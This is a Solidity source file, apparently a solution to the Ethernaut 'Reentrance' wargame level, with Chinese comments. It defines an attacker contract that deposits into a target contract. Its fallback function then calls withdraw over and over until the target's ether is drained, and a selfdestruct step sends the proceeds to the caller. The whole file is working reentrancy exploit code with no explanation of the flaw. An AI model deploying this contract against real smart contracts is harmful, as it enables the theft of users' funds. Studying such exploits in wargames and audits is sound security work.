pragma solidity ^0.6.0;

interface Reentrance{
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAttacker{
    Reentrance ReentranceImpl;
    uint256 requiredValue; //构造函数传进来的   5wei

    constructor(address addr) public payable {
        ReentranceImpl = Reentrance(addr);  // 实例化被攻击的合约
        requiredValue = msg.value;
    }

    function getBalance(address addr) public view returns (uint) {
        return addr.balance;  //当前合约账户余额
    }

    function donate() public {
        ReentranceImpl.donate{value: requiredValue}(address(this));  // 被攻击合约 donate 
    }

    function withdraw(uint _amount) public{
        ReentranceImpl.withdraw(_amount);  //  被攻击合约 withdraw 
    }

    function destruct() public{
        selfdestruct(msg.sender);     // 合约销毁
    }
    // 收到资金时  从合约中提取余额  
    fallback() external payable{
        uint256 ReentranceImplValue = address(ReentranceImpl).balance; //被攻击合约 余额
        if(ReentranceImplValue >= requiredValue){
            withdraw(requiredValue);         
        }else if(ReentranceImplValue > 0){
            withdraw(ReentranceImplValue);
        }
    }
}